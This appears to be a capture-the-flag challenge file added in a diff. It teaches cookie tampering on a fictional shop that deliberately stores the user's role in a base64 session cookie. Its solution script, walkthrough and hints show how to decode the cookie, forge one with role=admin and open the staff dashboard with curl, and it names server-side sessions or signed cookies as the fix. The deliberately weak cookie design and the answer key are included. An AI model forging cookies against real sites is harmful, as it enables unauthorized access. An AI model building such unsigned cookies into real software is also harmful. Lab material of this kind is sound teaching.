@@ -1,0 +1,66 @@
+title: The cookie that says who you are
+category: web
+level: Intermediate
+kind: Web
+topic: Sign-ins and sessions
+teaser: your session cookie is just your name and role, lightly disguised
+points: 60
+order: 1
+packages: httpd
+answer: flag
+var: ME = person
+var: MYPW = word
+
+@intro
+You have a customer account at Copperleaf Market (http://copperleaf.example/):
+user {{ME}}, password {{MYPW}}. Sign in and look closely at the cookie the shop
+gives you. It looks like random letters - but is it?
+
+The staff dashboard (/admin) only opens for staff. Get in, and the staff code is
+the flag.
+
+@setup
+systemctl enable --now httpd
+echo '127.0.0.1 copperleaf.example' >> /etc/hosts
+
+@web
+[ { "path": "/", "kind": "shop",
+    "settings": { "flag": "{{FLAG}}", "weak": "b64cookie", "me": "{{ME}}", "mypass": "{{MYPW}}", "accounts": "owner|{{MYPW}}{{MYPW}}|admin|owner@copperleaf.example" } } ]
+
+@solution
+curl -si -d "user={{ME}}&pass={{MYPW}}" http://copperleaf.example/login
+C=$(curl -s -d "user={{ME}}&pass={{MYPW}}" http://copperleaf.example/login | grep -o 'session=[A-Za-z0-9+/=]*' | cut -d= -f2-)
+echo $C | base64 -d
+echo
+curl -s -b "session=$C" http://copperleaf.example/admin
+A=$(echo -n 'user={{ME}};role=admin' | base64)
+curl -s -b "session=$A" http://copperleaf.example/admin
+
+@walkthrough
+Signing in gives a cookie:
+
+    curl -si -d "user={{ME}}&pass={{MYPW}}" http://copperleaf.example/login
+
+The value ends in = and uses letters, digits, + and / - that is base64, an encoding
+anyone can undo, not a lock:
+
+    echo VALUE | base64 -d        ->  user={{ME}};role=customer
+
+The shop believes whatever the cookie says. Write your own cookie with role=admin
+and send it:
+
+    A=$(echo -n 'user={{ME}};role=admin' | base64)
+    curl -s -b "session=$A" http://copperleaf.example/admin
+
+and the dashboard opens. The fix: the server must keep who you are on its own side
+(an unguessable session id that points to its records), or sign the cookie so any
+change is noticed.
+
+@hint 5
+The cookie's value is not random: the = at the end and the mix of letters, digits, + and / are the signs of base64. Decode it with base64 -d and read what it says about you.
+
+@hint 10
+If the shop reads your role from the cookie and never checks it, you can write a new cookie. Make the same text with a different role and encode it again: echo -n 'user=NAME;role=...' | base64 (the -n stops echo adding a line break, which would change the result).
+
+@hint 15
+Send your new cookie with curl -s -b "session=VALUE" http://copperleaf.example/admin. Staff roles are usually called something like admin.
